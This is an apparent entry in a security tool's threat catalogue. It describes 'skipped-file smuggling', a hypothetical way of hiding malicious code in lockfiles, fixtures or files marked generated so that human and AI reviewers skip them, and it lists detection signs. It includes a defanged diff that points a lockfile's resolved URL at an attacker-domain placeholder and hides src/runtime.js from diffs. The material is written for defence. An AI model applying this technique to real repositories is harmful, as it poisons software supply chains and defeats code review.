# Skipped-file smuggling

**Type:** AI-era attack · **When:** possible future · **Status:** possible future

Possible future attack. It has not yet been seen in this exact form.

## What could happen
Human and AI reviewers often skip some files: lockfiles, generated code, minified bundles, vendored folders, test fixtures, binaries, notebooks. An attacker hides the logic there.
They can also mark a file as generated in `.gitattributes` (`linguist-generated`) so GitHub collapses it in the diff.

Precursors: real attacks have already hidden code in skipped places. [xz-utils](../multi-stage/xz-utils.md) used binary "test files", and lockfile `resolved` URLs have been tampered with. Nobody has measured how often AI reviewers skip these files.

## How it got in
1. The attacker changes a lockfile `resolved` URL or integrity hash, or adds a "fixture".
2. Or they mark a file `linguist-generated` so its diff is hidden by default.
3. Non-test code later imports the hidden file.

## Why it was hard to spot
- Nobody reads 10,000 lockfile lines.
- People assume "generated" and "fixture" files are safe.

## Signs to look for
- In one change: a lockfile `resolved` host or integrity hash changed with no version change; a new binary; a new `linguist-generated` or `export-ignore` attribute.
- Across changes over time: a "generated" or fixture file is later imported by non-test code.

## Defanged example
```
package-lock.json
-  "resolved": "https://registry.npmjs.org/<pkg>/-/<pkg>-1.2.3.tgz"
+  "resolved": "https://<attacker-domain>/<pkg>-1.2.3.tgz"
.gitattributes
+  src/runtime.js linguist-generated=true
```

## How Pushguard catches it
- Diff rules: `js-lockfile-only-change` and `js-dependency-from-url`; binary rules (`binary-executable-committed`, `binary-archive-committed`); `gitattributes-filter` for filter drivers.
- Not built: a lockfile parser that checks the registry host allowlist and integrity drift, or a rule for new `linguist-generated` marks.
- Planned: facts + symbol graph to notice runtime imports of fixture paths.

## References
- Scenario F3 in the AI-era notes; no external citation.
- [SafeDep on lockfile poisoning](https://safedep.substack.com/p/lockfile-poisoning-an-attack-vector) (search-summary)
